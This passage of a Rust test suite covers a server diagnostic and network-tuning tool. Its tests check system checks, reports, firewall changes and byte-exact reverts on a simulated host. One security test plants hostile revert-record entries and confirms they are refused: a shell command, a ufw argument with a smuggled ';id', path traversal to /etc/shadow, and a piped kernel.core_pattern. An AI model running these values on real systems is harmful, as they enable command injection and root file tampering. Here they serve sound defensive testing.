    let nspawn = distro("arch").cmd("systemd-detect-virt --container", 0, "systemd-nspawn\n");
    assert_eq!(checks::container(&nspawn).as_deref(), Some("systemd-nspawn"));
    assert_eq!(checks::container(&distro("arch")), None);
}

#[test]
fn mtu_limits_selinux_denials_clock_discovery() {
    let sys = distro("debian-12").file("/sys/class/net/eth0/mtu", "1200\n");
    let m = get(&run(&sys).1, "mtu").clone();
    assert_eq!(m.status, Status::Fail);
    assert!(m.summary.contains("below 1248"), "{}", m.summary);
    let sys = distro("debian-12").file(
        "/proc/self/limits",
        "Max open files            1024                 1024                 files     \n",
    );
    let l = get(&run(&sys).1, "limits").clone();
    assert_eq!(l.status, Status::Warn);
    assert!(fix_text(&l).starts_with("echo 'alice hard nofile 65536' | sudo tee /etc/security/limits.d/90-qsh.conf"));
    let sys = distro("rocky-9").root().cmd(
        "ausearch -m avc -c qsh-server -ts recent",
        0,
        "----\ntype=AVC msg=audit(1): avc:  denied  { name_bind } for comm=\"qsh-server\"\n----\ntype=AVC msg=audit(2): avc:  denied\n",
    );
    let s = get(&run(&sys).1, "selinux").clone();
    assert_eq!(
        (s.status, s.summary.as_str()),
        (Status::Warn, "SELinux enforcing denied qsh-server 2 times recently")
    );
    assert_eq!(
        fix_text(&s),
        "sudo ausearch -m avc -c qsh-server -ts recent | audit2why"
    );
    let mut sys = distro("arch");
    sys.clock = Some(false);
    assert_eq!(get(&run(&sys).1, "clock").status, Status::Info);
    // Discovery: not in PATH, but in ~/.local/bin
    let sys = distro("arch").cmd("env -i sh -c command -v qsh-server", 1, "").meta(
        "/home/alice/.local/bin/qsh-server",
        1000,
        0o755,
        false,
    );
    assert_eq!(
        get(&run(&sys).1, "discovery").summary,
        "qsh HOST finds /home/alice/.local/bin/qsh-server"
    );
    // Nowhere: the link to this program, and the distribution's package
    let sys = distro("arch").cmd("env -i sh -c command -v qsh-server", 1, "");
    let d = get(&run(&sys).1, "discovery").clone();
    assert_eq!(d.status, Status::Fail);
    assert_eq!(
        fix_text(&d),
        "mkdir -p ~/.local/bin && ln -sf /opt/qsh/bin/qsh-server ~/.local/bin/qsh-server"
    );
    assert!(d.fix.unwrap().note.unwrap().contains("sudo pacman -S qsh"));
}

#[test]
fn sudo_checks_the_invoking_user() {
    let sys = distro("debian-12")
        .root()
        .env("SUDO_USER", "alice")
        .env("SUDO_UID", "1000");
    let user = checks::target_user(&sys, Some(("root".into(), "/root".into())));
    assert_eq!(
        user,
        User {
            name: "alice".into(),
            uid: 1000,
            home: "/home/alice".into(),
            sudo: true
        }
    );
    let me = checks::target_user(&distro("debian-12"), Some(("bob".into(), "/home/bob".into())));
    assert_eq!((me.name.as_str(), me.sudo), ("bob", false));
}

// ---------------------------------------------------------------------------------------
// Reports

#[test]
fn the_human_report_is_one_line_per_check_with_the_fix_under_problems() {
    let sys = distro("rocky-9");
    let (host, checks) = run(&sys);
    let text = report::human(&host, &checks, &Style::PLAIN);
    let lines: Vec<&str> = text.lines().collect();
    assert_eq!(
        lines[0],
        "qsh-server doctor: web1 — Rocky Linux 9.4 (Blue Onyx), systemd 252, kernel 5.14.0, KVM"
    );
    assert_eq!(lines[1], "");
    assert_eq!(
        lines[2],
        "  ok    daemon         0.5.0 running, UDP+TCP 60443, 3 sessions"
    );
    assert!(
        text.contains(
            "  fail  firewall       firewalld (zone public) is active and allows neither UDP nor TCP 60443\n                       fix: sudo qsh-server tune --apply\n"
        ),
        "{text}"
    );
    assert!(
        text.contains("  warn  udp-buffers    net.core.rmem_max is 212992, net.core.wmem_max is 212992; QUIC on long fast\n                       paths needs 4194304\n                       fix: sudo qsh-server tune --apply\n"),
        "{text}"
    );
    assert_eq!(
        lines.last().copied(),
        Some("1 problem stops a transport, 2 slow qsh down. sudo qsh-server tune shows what it would change.")
    );
    // No line longer than the width, except copyable commands
    for l in &lines {
        assert!(l.chars().count() <= 100 || l.contains("fix:"), "{l}");
    }
    // Marks on a terminal
    let tty = Style {
        marks: true,
        color: false,
        width: 100,
    };
    let text = report::human(&host, &checks, &tty);
    assert!(text.contains("  ✗ firewall"), "{text}");
    assert!(text.contains("  ✓ daemon"), "{text}");
}

#[test]
fn footers() {
    let ok = Check::new("a", Status::Ok, "x");
    assert_eq!(report::footer(std::slice::from_ref(&ok)), "Nothing to fix.");
    let w = Check::new("b", Status::Warn, "x");
    assert_eq!(report::footer(&[ok, w.clone(), w]), "2 problems slow qsh down.");
    let f = Check::new("c", Status::Fail, "x");
    assert_eq!(report::footer(&[f.clone(), f]), "2 problems stop a transport.");
}

#[test]
fn json_report_schema() {
    let sys = distro("amazon-2023");
    let (host, checks) = run(&sys);
    let j = report::json(&host, &DaemonState::Running(status_json("0.5.0", 3)), true, &checks);
    for key in ["doctor", "version", "host", "daemon", "checks"] {
        assert!(j.get(key).is_some(), "{key}");
    }
    let b = j["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["id"] == "udp-buffers")
        .unwrap();
    assert_eq!(b["status"], "warn");
    assert_eq!(b["facts"]["rmem_max"], 212992);
    assert_eq!(b["facts"]["wanted"], 4194304);
    assert_eq!(b["fix"]["root"], true);
    assert_eq!(b["fix"]["tune"], "udp-buffers");
    assert_eq!(b["fix"]["commands"][0], "sudo sysctl -w net.core.rmem_max=4194304");
    assert_eq!(j["daemon"]["udp"], 60443);
    assert_eq!(j["host"]["cloud"], "aws");
    assert_eq!(super::exit_status(&checks), 0);
}

// ---------------------------------------------------------------------------------------
// tune

fn options() -> Options {
    Options {
        bbr_default: false,
        low_ports: None,
        linger: false,
        ports: Ports {
            range: 60443..=60542,
            extra: vec![],
            udp: 60443,
            tcp: 60443,
        },
    }
}

fn root_alice(f: Fake) -> Fake {
    f.root().env("SUDO_USER", "alice").env("SUDO_UID", "1000")
}

fn sudo_alice() -> User {
    User { sudo: true, ..alice() }
}

fn plan_of(sys: &Fake, opts: &Options) -> Plan {
    let host = HostInfo::read(sys);
    tune::plan(sys, &host, &sudo_alice(), opts)
}

/// modprobe tcp_bbr makes bbr available, as the kernel does.
fn with_modprobe(f: Fake) -> Fake {
    f.cmd("modprobe tcp_bbr", 0, "")
        .effect(
            "modprobe tcp_bbr",
            "/proc/sys/net/ipv4/tcp_available_congestion_control",
            Some("reno cubic bbr\n"),
        )
        .cmd("modprobe -r tcp_bbr", 0, "")
        .effect(
            "modprobe -r tcp_bbr",
            "/proc/sys/net/ipv4/tcp_available_congestion_control",
            Some("reno cubic\n"),
        )
}

#[test]
fn tune_applies_idempotently_and_reverts_byte_for_byte() {
    let sys = with_modprobe(root_alice(distro("ubuntu-24.04")));
    let before = sys.snapshot();
    let plan = plan_of(&sys, &options());
    let rendered = tune::render(&plan);
    assert_eq!(
        rendered,
        "# tcp-bbr: /etc/modules-load.d/qsh.conf\n--- /dev/null\n+++ b/etc/modules-load.d/qsh.conf\n@@ -0,0 +1,2 @@\n+# Written by qsh-server tune (qsh-server(1)): BBR for qsh's TLS connections and the ssh pipe.\n+tcp_bbr\n\n# tcp-bbr: at once\nmodprobe tcp_bbr\n\n# udp-buffers, tcp-bbr: /etc/sysctl.d/90-qsh.conf\n--- /dev/null\n+++ b/etc/sysctl.d/90-qsh.conf\n@@ -0,0 +1,4 @@\n+# Written by qsh-server tune (qsh-server(1)); qsh-server tune --revert removes it.\n+net.core.rmem_max = 4194304\n+net.core.wmem_max = 4194304\n+net.ipv4.tcp_allowed_congestion_control = reno cubic bbr\n\n# udp-buffers: at once\nsysctl -w net.core.rmem_max=4194304    # was 212992\nsysctl -w net.core.wmem_max=4194304    # was 212992\n\n# tcp-bbr: at once\nsysctl -w 'net.ipv4.tcp_allowed_congestion_control=reno cubic bbr'    # was reno cubic\n"
    );
    let mut log = Vec::new();
    tune::apply(&sys, &plan, &mut |l| log.push(l)).unwrap();
    assert_eq!(sys.read("/proc/sys/net/core/rmem_max").as_deref(), Some("4194304\n"));
    assert_eq!(
        sys.read("/proc/sys/net/ipv4/tcp_allowed_congestion_control").as_deref(),
        Some("reno cubic bbr\n")
    );
    assert!(sys.read(tune::RECORD).unwrap().contains("\"qsh_tune\": 1"));
    // Doctor agrees now
    let (_, checks) = run(&sys);
    assert_eq!(get(&checks, "udp-buffers").status, Status::Ok);
    assert_eq!(get(&checks, "tcp-bbr").status, Status::Ok);
    // Twice: nothing to do
    assert_eq!(plan_of(&sys, &options()).steps, vec![]);
    // Revert: every file as before, the record and the directories tune created gone
    let record = tune::Record::load(&sys).unwrap().unwrap();
    let warnings = tune::revert(&sys, &record, &mut |l| log.push(l)).unwrap();
    assert_eq!(warnings, Vec::<String>::new());
    assert_eq!(sys.snapshot(), before);
    for d in ["/var/lib/qsh", "/etc/sysctl.d", "/etc/modules-load.d"] {
        assert!(!sys.exists(d), "{d} left behind");
    }
    assert!(sys.ran.borrow().contains(&"modprobe -r tcp_bbr".to_string()));
}

#[test]
fn tune_keeps_what_is_there_and_never_lowers() {
    let sys = root_alice(distro("debian-12"))
        .file("/proc/sys/net/core/rmem_max", "16777216\n")
        .file(
            "/etc/sysctl.d/90-qsh.conf",
            "# mine\nnet.core.wmem_max = 1000\nvm.swappiness = 10\n",
        )
        .file(
            "/proc/sys/net/ipv4/tcp_available_congestion_control",
            "reno cubic bbr\n",
        );
    let before = sys.snapshot();
    let plan = plan_of(&sys, &options());
    let Step::File { after, .. } = &plan.steps[0] else {
        panic!("{plan:?}")
    };
    assert_eq!(
        after,
        "# mine\nnet.core.wmem_max = 4194304\nvm.swappiness = 10\nnet.ipv4.tcp_allowed_congestion_control = reno cubic bbr\n"
    );
    assert!(
        !plan.steps.iter().any(|s| matches!(s, Step::Module { .. })),
        "bbr is loaded"
    );
    assert!(!plan
        .steps
        .iter()
        .any(|s| matches!(s, Step::Sysctl { key, .. } if key == "net.core.rmem_max")));
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    let record = tune::Record::load(&sys).unwrap().unwrap();
    tune::revert(&sys, &record, &mut |_| {}).unwrap();
    assert_eq!(sys.snapshot(), before, "the administrator's file is back as it was");
}

#[test]
fn revert_leaves_alone_what_someone_changed_since() {
    let sys = root_alice(distro("arch")).file(
        "/proc/sys/net/ipv4/tcp_available_congestion_control",
        "reno cubic bbr\n",
    );
    let plan = plan_of(&sys, &options());
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    sys.write("/etc/sysctl.d/90-qsh.conf", b"# edited\n", 0o644, None)
        .unwrap();
    sys.set("/proc/sys/net/core/rmem_max", "8388608\n").unwrap();
    let record = tune::Record::load(&sys).unwrap().unwrap();
    let warnings = tune::revert(&sys, &record, &mut |_| {}).unwrap();
    assert_eq!(
        warnings,
        [
            "net.core.rmem_max is 8388608 now, not what tune set (4194304): left alone",
            "/etc/sysctl.d/90-qsh.conf changed since tune wrote it: left alone"
        ]
    );
    assert_eq!(sys.read("/etc/sysctl.d/90-qsh.conf").as_deref(), Some("# edited\n"));
    assert_eq!(sys.read("/proc/sys/net/core/wmem_max").as_deref(), Some("212992\n"));
    assert!(sys.read(tune::RECORD).is_none());
}

#[test]
fn tune_opens_ufw_and_reverts_its_files() {
    let rules = "*filter\n:ufw-user-input - [0:0]\n### RULES ###\n\n### tuple ### allow tcp 22 0.0.0.0/0 any 0.0.0.0/0 in\n-A ufw-user-input -p tcp --dport 22 -j ACCEPT\n\n### END RULES ###\nCOMMIT\n";
    let added = rules.replace(
        "\n### END RULES",
        "\n### tuple ### allow udp 60443:60542 0.0.0.0/0 any 0.0.0.0/0 in comment=717368\n-A ufw-user-input -p udp --dport 60443:60542 -j ACCEPT\n\n### END RULES",
    );
    let sys = ufw_active(root_alice(distro("ubuntu-24.04")))
        .file("/proc/sys/net/core/rmem_max", "4194304\n")
        .file("/proc/sys/net/core/wmem_max", "4194304\n")
        .file("/proc/sys/net/ipv4/tcp_allowed_congestion_control", "reno cubic bbr\n")
        .file("/etc/ufw/user.rules", rules)
        .file("/etc/ufw/user6.rules", "*filter\nCOMMIT\n")
        .cmd("ufw allow 60443:60542/udp comment qsh", 0, "Rule added\n")
        .effect(
            "ufw allow 60443:60542/udp comment qsh",
            "/etc/ufw/user.rules",
            Some(&added),
        )
        .cmd("ufw allow 60443:60542/tcp comment qsh", 0, "Rule added\n")
        .cmd("ufw reload", 0, "Firewall reloaded\n")
        .cmd("ufw delete allow 60443:60542/udp", 0, "Rule deleted\n")
        .cmd("ufw delete allow 60443:60542/tcp", 0, "Rule deleted\n");
    let before = sys.snapshot();
    let plan = plan_of(&sys, &options());
    assert_eq!(
        tune::render(&plan),
        "# firewall\nufw allow 60443:60542/udp comment qsh\nufw allow 60443:60542/tcp comment qsh\n"
    );
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    assert_eq!(sys.read("/etc/ufw/user.rules").as_deref(), Some(added.as_str()));
    let record = tune::Record::load(&sys).unwrap().unwrap();
    tune::revert(&sys, &record, &mut |_| {}).unwrap();
    assert_eq!(sys.snapshot(), before);
    assert_eq!(sys.ran.borrow().last().map(String::as_str), Some("ufw reload"));
    // Changed since: the rules are deleted with ufw itself
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    sys.write("/etc/ufw/user.rules", b"admin edit\n", 0o644, None).unwrap();
    let record = tune::Record::load(&sys).unwrap().unwrap();
    let warnings = tune::revert(&sys, &record, &mut |_| {}).unwrap();
    assert_eq!(warnings.len(), 1, "{warnings:?}");
    let ran = sys.ran.borrow();
    assert!(ran.iter().any(|c| c == "ufw delete allow 60443:60542/udp"), "{ran:?}");
    assert_eq!(sys.read("/etc/ufw/user.rules").as_deref(), Some("admin edit\n"));
}

#[test]
fn tune_firewalld_linger_and_the_explicit_flags() {
    let sys = root_alice(distro("rocky-9"))
        .file("/proc/sys/net/core/rmem_max", "4194304\n")
        .file("/proc/sys/net/core/wmem_max", "4194304\n")
        .file(
            "/proc/sys/net/ipv4/tcp_available_congestion_control",
            "reno cubic bbr\n",
        )
        .file("/proc/sys/net/ipv4/tcp_allowed_congestion_control", "reno cubic bbr\n")
        .file(
            "/etc/systemd/logind.conf.d/kill.conf",
            "[Login]\nKillUserProcesses=yes\n",
        );
    let plan = plan_of(&sys, &options());
    assert_eq!(
        tune::render(&plan),
        "# firewall\nfirewall-cmd --permanent --zone=public --add-service=qsh\nfirewall-cmd --reload\n\n# linger\nloginctl enable-linger alice\n"
    );
    let Step::Commands { undo, files, .. } = &plan.steps[0] else {
        panic!()
    };
    assert_eq!(
        undo[0].join(" "),
        "firewall-cmd --permanent --zone=public --remove-service=qsh"
    );
    assert_eq!(files[0], "/etc/firewalld/zones/public.xml");
    // The explicit flags
    let opts = Options {
        bbr_default: true,
        low_ports: Some(443),
        ..options()
    };
    let text = tune::render(&plan_of(&sys, &opts));
    assert!(
        text.contains("+net.core.default_qdisc = fq\n+net.ipv4.tcp_congestion_control = bbr\n+net.ipv4.ip_unprivileged_port_start = 443\n"),
        "{text}"
    );
    // Without sudo (root logged in): no linger, and a note for --linger
    let host = HostInfo::read(&sys);
    let plan = tune::plan(
        &sys,
        &host,
        &alice(),
        &Options {
            linger: true,
            ..options()
        },
    );
    assert!(!tune::render(&plan).contains("loginctl"));
    assert!(plan.notes.iter().any(|n| n.contains("SUDO_USER")));
}

#[test]
fn tune_in_a_container_changes_no_sysctl() {
    let sys = root_alice(distro("debian-12")).file("/.dockerenv", "");
    let plan = plan_of(&sys, &options());
    assert!(plan.steps.is_empty(), "{plan:?}");
    assert!(plan.notes[0].starts_with("inside a docker container"));
}

#[test]
fn tune_command_asks_needs_root_and_refuses_without_a_terminal() {
    let sys = with_modprobe(root_alice(distro("arch")));
    let host = HostInfo::read(&sys);
    let mut request = Request {
        apply: true,
        revert: false,
        yes: false,
        options: Options {
            low_ports: Some(443),
            ..options()
        },
    };
    let mut out = Vec::new();
    // Not root on the real system: the plan, then how to run it
    let code = tune::command(
        &sys,
        &host,
        &sudo_alice(),
        &request,
        true,
        &mut |_| Some(true),
        &mut out,
    );
    let text = String::from_utf8_lossy(&out).into_owned();
    assert_eq!(code, 1);
    assert!(
        text.contains("warning: --allow-low-ports=443: every local user"),
        "{text}"
    );
    assert!(
        text.ends_with("--apply needs root: sudo qsh-server tune --apply\n"),
        "{text}"
    );
    assert!(sys.read(tune::RECORD).is_none());
    // No terminal and no --yes
    out.clear();
    assert_eq!(
        tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
        1
    );
    assert!(String::from_utf8_lossy(&out).contains("no terminal to confirm on"));
    // "n"
    out.clear();
    assert_eq!(
        tune::command(
            &sys,
            &host,
            &sudo_alice(),
            &request,
            false,
            &mut |_| Some(false),
            &mut out
        ),
        1
    );
    assert!(sys.read(tune::RECORD).is_none());
    // "y"
    out.clear();
    let mut asked = String::new();
    let code = tune::command(
        &sys,
        &host,
        &sudo_alice(),
        &request,
        false,
        &mut |q| {
            asked = q.to_string();
            Some(true)
        },
        &mut out,
    );
    assert_eq!((code, asked.as_str()), (0, "Apply these changes? [y/N] "));
    assert_eq!(
        sys.read("/proc/sys/net/ipv4/ip_unprivileged_port_start").as_deref(),
        Some("443\n")
    );
    // Again: nothing to change
    out.clear();
    assert_eq!(
        tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
        0
    );
    let text = String::from_utf8_lossy(&out).into_owned();
    assert!(text.contains("nothing to change"), "{text}");
    // Revert with --yes
    request.revert = true;
    request.apply = false;
    request.yes = true;
    out.clear();
    assert_eq!(
        tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
        0
    );
    assert_eq!(
        sys.read("/proc/sys/net/ipv4/ip_unprivileged_port_start").as_deref(),
        Some("1024\n")
    );
    out.clear();
    assert_eq!(
        tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
        0
    );
    assert!(String::from_utf8_lossy(&out).contains("nothing to revert"));
}

#[test]
fn the_record_round_trips_and_rejects_other_formats() {
    let sys = with_modprobe(root_alice(distro("ubuntu-24.04")));
    let plan = plan_of(&sys, &options());
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    let record = tune::Record::load(&sys).unwrap().unwrap();
    assert_eq!(tune::Record::from_json(&record.to_json()), Some(record.clone()));
    // The fixture has no /var: tune created it, and its revert removes it
    assert_eq!(record.created_dirs, ["/var", "/var/lib", "/var/lib/qsh"]);
    sys.write(tune::RECORD, b"{\"qsh_tune\":9}", 0o600, None).unwrap();
    assert!(tune::Record::load(&sys).unwrap_err().contains("unknown format"));
    sys.write(tune::RECORD, b"not json", 0o600, None).unwrap();
    assert!(tune::Record::load(&sys).is_err());
}

/// Review M2: the record holds copies of firewall files (ufw's user.rules is 0640), so it is
/// 0600 in a 0700 directory; and a revert puts a file back with the mode and owner it had,
/// not 0644.
#[test]
fn the_record_is_private_and_a_revert_keeps_modes_and_owners() {
    let rules = "*filter\nCOMMIT\n";
    let added = "*filter\n-A ufw-user-input -p udp --dport 60443:60542 -j ACCEPT\nCOMMIT\n";
    let sys = ufw_active(root_alice(distro("ubuntu-24.04")))
        .file("/proc/sys/net/core/rmem_max", "4194304\n")
        .file("/proc/sys/net/core/wmem_max", "4194304\n")
        .file("/proc/sys/net/ipv4/tcp_allowed_congestion_control", "reno cubic bbr\n")
        .file("/etc/ufw/user.rules", rules)
        .file("/etc/ufw/user6.rules", rules)
        .cmd("ufw allow 60443:60542/udp comment qsh", 0, "")
        .effect(
            "ufw allow 60443:60542/udp comment qsh",
            "/etc/ufw/user.rules",
            Some(added),
        )
        .cmd("ufw allow 60443:60542/tcp comment qsh", 0, "")
        .cmd("ufw reload", 0, "");
    sys.modes
        .borrow_mut()
        .insert("/etc/ufw/user.rules".into(), (0o640, 0, 4));
    sys.modes
        .borrow_mut()
        .insert("/etc/ufw/user6.rules".into(), (0o640, 0, 4));
    let plan = plan_of(&sys, &options());
    tune::apply(&sys, &plan, &mut |_| {}).unwrap();
    let mode = |p: &str| System::meta(&sys, p).map(|m| (m.mode, m.uid, m.gid));
    assert_eq!(mode(tune::RECORD), Some((0o600, 0, 0)));
    assert_eq!(mode("/var/lib/qsh"), Some((0o700, 0, 0)));
    assert!(
        sys.read(tune::RECORD).unwrap().contains("*filter"),
        "a copy of the rules"
    );
    // The tool rewrote the file (the fake leaves the mode the fixture gave it)
    let record = tune::Record::load(&sys).unwrap().unwrap();
    tune::revert(&sys, &record, &mut |_| {}).unwrap();
    assert_eq!(sys.read("/etc/ufw/user.rules").as_deref(), Some(rules));
    assert_eq!(mode("/etc/ufw/user.rules"), Some((0o640, 0, 4)));
}

/// A valid record, as JSON, from applying the default plan on an Ubuntu fixture.
fn record_json(sys: &Fake) -> Value {
    tune::apply(sys, &plan_of(sys, &options()), &mut |_| {}).unwrap();
    serde_json::from_str(&sys.read(tune::RECORD).unwrap()).unwrap()
}

/// Review H3: the record decides what `--revert` runs and writes as root. A record that tune
/// could not have written is refused as a whole, before anything is shown or done: another
/// program or argument, a path outside tune's own files (`..` included), a sysctl tune does
/// not set (or with a `/` in its name), a module other than tcp_bbr; and a record or directory
/// that someone other than root could have written.
#[test]
fn records_tune_did_not_write_are_refused() {
    let base = || with_modprobe(root_alice(distro("ubuntu-24.04"))).dir("/var/lib/qsh");
    let sys = base();
    let valid = record_json(&sys);
    assert!(tune::Record::load(&sys).unwrap().is_some());
    let file = |path: &str| json!({"kind":"file","path":path,"before":null,"sha256":null,"fixes":["udp-buffers"],"created_dirs":[]});
    let commands = |fix: &str, run: Value, files: Value, reload: Value| {
        let files: Vec<Value> = files
            .as_array()
            .unwrap()
            .iter()
            .map(|p| json!({"path":p,"before":null,"sha256":null}))
            .collect();
        json!({"kind":"commands","fix":fix,"run":run,"undo":run,"files":files,"reload":reload})
    };
    let planted: Vec<(&str, Value)> = vec![
        (
            "a shell",
            commands(
                "firewall",
                json!([["sh", "-c", "touch /pwned"]]),
                json!([]),
                Value::Null,
            ),
        ),
        (
            "ufw reset",
            commands(
                "firewall",
                json!([["ufw", "--force", "reset"]]),
                json!(["/etc/ufw/user.rules", "/etc/ufw/user6.rules"]),
                json!(["ufw", "reload"]),
            ),
        ),
        (
            "a ufw rule with a shell word",
            commands(
                "firewall",
                json!([["ufw", "allow", "22;id", "comment", "qsh"]]),
                json!(["/etc/ufw/user.rules", "/etc/ufw/user6.rules"]),
                json!(["ufw", "reload"]),
            ),
        ),
        (
            "ufw with other files",
            commands(
                "firewall",
                json!([["ufw", "allow", "22", "comment", "qsh"]]),
                json!(["/etc/shadow", "/etc/ufw/user6.rules"]),
                json!(["ufw", "reload"]),
            ),
        ),
        (
            "a zone with a path",
            commands(
                "firewall",
                json!([["firewall-cmd", "--permanent", "--zone=../../x", "--add-service=qsh"]]),
                json!([
                    "/etc/firewalld/zones/../../x.xml",
                    "/etc/firewalld/zones/../../x.xml.old"
                ]),
                json!(["firewall-cmd", "--reload"]),
            ),
        ),
        (
            "linger for an option",
            commands(
                "linger",
                json!([["loginctl", "enable-linger", "--help"]]),
                json!([]),
                Value::Null,
            ),
        ),
        ("an escaping path", file("/../../victim.txt")),
        ("a path through ..", file("/etc/sysctl.d/../../victim.txt")),
        ("another file", file("/etc/passwd")),
        (
            "a sysctl with a slash",
            json!({"kind":"sysctl","fix":"udp-buffers","key":"net/../../../etc/shadow","before":"1","after":"2"}),
        ),
        (
            "a sysctl tune does not set",
            json!({"kind":"sysctl","fix":"udp-buffers","key":"kernel.core_pattern","before":"core","after":"|/tmp/x"}),
        ),
        (
            "a sysctl value with a pipe",
            json!({"kind":"sysctl","fix":"udp-buffers","key":"net.core.rmem_max","before":"|/tmp/x","after":"4194304"}),
        ),
        ("another module", json!({"kind":"module","fix":"tcp-bbr","name":"evil"})),
    ];
    for (what, change) in planted {
        let sys = base();
        let mut record = valid.clone();
        record["changes"].as_array_mut().unwrap().push(change);
        sys.write(tune::RECORD, record.to_string().as_bytes(), 0o600, None)
            .unwrap();
        let error = tune::Record::load(&sys).unwrap_err();
        assert!(error.contains("did not write"), "{what}: {error}");
        // The command refuses too, and runs nothing
        let host = HostInfo::read(&sys);
        let ran = sys.ran.borrow().len();
        let mut out = Vec::new();
        let request = Request {
            apply: false,
            revert: true,
            yes: true,
            options: options(),
        };
        assert_eq!(
            tune::command(&sys, &host, &sudo_alice(), &request, false, &mut |_| None, &mut out),
            1,
            "{what}"
        );
        assert_eq!(
            sys.ran.borrow().len(),
            ran,
            "{what}: ran {:?}",
            &sys.ran.borrow()[ran..]
        );
    }
    let mut record = valid.clone();
    record["created_dirs"] = json!(["/home/alice"]);
    let sys = base();
    sys.write(tune::RECORD, record.to_string().as_bytes(), 0o600, None)
        .unwrap();
    assert!(tune::Record::load(&sys).is_err(), "a directory tune does not create");
    // Who could have written it
    for (mode, owner, why) in [
        (0o666, None, "writable by group or others"),
        (0o620, None, "writable by group or others"),
        (0o600, Some((1000, 1000)), "belongs to another user"),
    ] {
        let sys = base();
        sys.write(tune::RECORD, valid.to_string().as_bytes(), mode, owner)
            .unwrap();
        let error = tune::Record::load(&sys).unwrap_err();
        assert!(error.contains(why), "{error}");
    }
    let sys = base();
    record_json(&sys);
    sys.modes.borrow_mut().insert("/var/lib/qsh".into(), (0o777, 0, 0));
    assert!(tune::Record::load(&sys)
        .unwrap_err()
        .contains("/var/lib/qsh is writable"));
}

// ---------------------------------------------------------------------------------------
// qsh doctor HOST

fn probe(t: Transport, port: u16, failure: Option<FailureKind>) -> Probe {
    Probe {
        transport: t,
        port,
        failure: failure.map(|k| (k, format!("{k}"))),
        handshake: Some(std::time::Duration::from_millis(400)),
        rtt: Some(std::time::Duration::from_millis(270)),
        loss: None,
        mtu: None,
        observed: None,
        local_port: None,
    }
}

fn remote_with(firewall: &str, cloud: Option<&str>) -> Remote {
    Remote::Report(json!({
        "doctor": 1,
        "host": {"name": "web1", "cloud": cloud},
        "checks": [{"id": "firewall", "status": firewall, "summary": "",
                    "fix": {"root": true, "commands": ["sudo ufw allow 60443:60542/udp"]}}],
    }))
}

#[test]
fn the_remote_report_is_found_after_login_noise() {
    let out = "Welcome to web1!\n{\"doctor\":1,\"checks\":[]}\n";
    assert!(matches!(parse_remote(Some(1), out, ""), Remote::Report(_)));
    assert_eq!(parse_remote(Some(42), "", ""), Remote::NoServer);
    assert_eq!(
        parse_remote(Some(127), "", "sh: qsh-server: not found"),
        Remote::NoServer
    );
    assert_eq!(
        parse_remote(Some(2), "", "error: unrecognized subcommand 'doctor'\n"),
        Remote::Old
    );
    assert!(matches!(parse_remote(Some(255), "", "ssh: connect: refused"), Remote::Error(e) if e.contains("refused")));
}

#[test]
fn diagnoses_combine_both_sides() {
    let quic_blocked = [
        probe(Transport::Quic, 60443, Some(FailureKind::Timeout)),
        probe(Transport::Tls, 60443, None),
        probe(Transport::Ssh, 0, None),
    ];
    let d = diagnose("web1", &quic_blocked, &remote_with("ok", Some("aws")));
    assert_eq!(
        d[0],
        "UDP 60443 times out from here, the server's firewall allows it, and the server is on Amazon EC2: the security group most likely blocks UDP 60443"
    );
    let d = diagnose("web1", &quic_blocked, &remote_with("ok", None));
    assert_eq!(
        d[0],
        "nothing on the server blocks UDP, and TLS works: your network blocks UDP; qsh will use TLS on this network (remembered)"
    );
    let d = diagnose("web1", &quic_blocked, &remote_with("fail", None));
    assert_eq!(
        d[0],
        "UDP 60443 times out from here, and the server's firewall blocks it: sudo ufw allow 60443:60542/udp"
    );
    let d = diagnose("web1", &quic_blocked, &remote_with("skip", None));
    assert!(d[0].contains("need root to read"), "{d:?}");
    let all = [
        probe(Transport::Quic, 60443, None),
        probe(Transport::Tls, 60443, None),
        probe(Transport::Ssh, 0, None),
    ];
    assert_eq!(
        diagnose("web1", &all, &remote_with("ok", None)),
        ["QUIC works from here: qsh uses it, and keeps sessions across address changes"]
    );
    let nothing = [
        probe(Transport::Quic, 60443, Some(FailureKind::Timeout)),
        probe(Transport::Tls, 60443, Some(FailureKind::Timeout)),
        probe(Transport::Ssh, 0, Some(FailureKind::Other)),
    ];
    let d = diagnose("web1", &nothing, &remote_with("ok", None));
    assert_eq!(d.len(), 3, "{d:?}");
    assert!(d[2].starts_with("the ssh pipe fails"), "{d:?}");
    let d = diagnose("web1", &[probe(Transport::Ssh, 0, None)], &Remote::Old);
    assert!(d[0].contains("has no doctor (before 0.5.0)"), "{d:?}");
}

/// Review M5: `qsh doctor HOST` opened every probe at once (up to 18 unauthenticated
/// connections) while the daemon admits 8 per source; the refused ones were recorded as the
/// network blocking TLS. At most PROBES_AT_ONCE run at a time now.
#[tokio::test]
async fn probes_stay_within_the_daemons_limit_per_source() {
    use super::client::{at_most, PROBES_AT_ONCE};
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::Arc;
    let (now, most) = (Arc::new(AtomicUsize::new(0)), Arc::new(AtomicUsize::new(0)));
    type Job = std::pin::Pin<Box<dyn std::future::Future<Output = usize> + Send>>;
    let jobs: Vec<Job> = (0..18usize)
        .map(|i| {
            let (now, most) = (now.clone(), most.clone());
            Box::pin(async move {
                let n = now.fetch_add(1, Ordering::SeqCst) + 1;
                most.fetch_max(n, Ordering::SeqCst);
                tokio::time::sleep(std::time::Duration::from_millis(20)).await;
                now.fetch_sub(1, Ordering::SeqCst);
                i
            }) as Job
        })
        .collect();
    let out = at_most(jobs, PROBES_AT_ONCE).await;
    assert_eq!(out, (0..18).collect::<Vec<_>>(), "every result, in order");
    assert_eq!(most.load(Ordering::SeqCst), PROBES_AT_ONCE);
}

/// Review L2: `qsh doctor HOST --tune` runs sudo only on a qsh-server that root owns, in
/// directories only root can change; never on one the user (or anyone but root) could replace,
/// like `~/.local/bin/qsh-server`.
#[test]
fn tune_over_ssh_runs_sudo_only_on_a_program_root_controls() {
    use std::os::unix::fs::PermissionsExt;
